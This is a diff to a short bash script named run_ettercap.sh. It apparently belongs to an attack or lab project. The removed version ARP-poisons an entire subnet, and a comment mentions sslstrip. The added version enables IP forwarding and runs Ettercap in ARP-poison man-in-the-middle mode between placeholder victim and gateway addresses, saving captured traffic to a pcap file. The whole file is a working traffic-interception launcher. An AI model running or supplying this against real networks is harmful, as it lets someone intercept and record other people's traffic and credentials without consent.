@@ -1,13 +1,11 @@
-#!/usr/bin/env bash
-# MITM attack: ARP-poison entire subnet, sslstrip enabled
-# Usage: sudo ./run_ettercap.sh en0
+#!/bin/bash
+# src/attack/run_ettercap.sh
+# Launch Ettercap in ARP-poison + sslstrip mode
 
 set -e
-IFACE="${1:-en0}"
 
-echo "[*] Enabling IP forwarding"
-sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null
+echo "[*] Enabling IP forwarding..."
+sudo sysctl -w net.inet.ip.forwarding=1
 
-LOG=../../data/attack_$(date +%Y%m%d_%H%M%S).log
-echo "[*] Launching Ettercap on $IFACE  (log: $LOG)"
-sudo ettercap -T -q -i "$IFACE" -M arp:remote / /  2>&1 | tee "$LOG"
+echo "[*] Starting Ettercap..."
+sudo ettercap -T -M arp:remote /<victim IP>/ /<gateway IP>/ -w data/ettercap_session.pcap
